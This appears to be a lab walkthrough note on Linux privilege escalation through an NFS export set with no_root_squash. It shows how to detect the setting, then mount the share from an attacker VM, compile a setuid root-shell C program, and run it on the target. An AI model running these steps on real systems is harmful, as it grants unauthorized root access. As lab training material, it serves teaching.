[[Linux Privilege Escalation]]
**Detection**
Linux VM
1. In command line type:
```bash
cat /etc/exports
```


> 2. From the output, notice that “no_root_squash” option is defined for the “/tmp” export.

**Exploitation**
Attacker VM
  1. Open command prompt and type:
```bash
 showmount -e {target IP}
```
2. In command prompt type:
```bash
 mkdir /tmp/1
```
3. In command prompt type:
```bash
 mount -o rw,vers=2 {target IP}:/tmp /tmp/1
```

In command prompt type:

```bash
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c
```
4. In command prompt type: 
```bash
gcc /tmp/1/x.c -o /tmp/1/x
```
5. In command prompt type: 
```bash
chmod +s /tmp/1/x
```

Linux VM
1. In command prompt type: 
```bash
/tmp/x
```
2. In command prompt type:
```bash
 id
```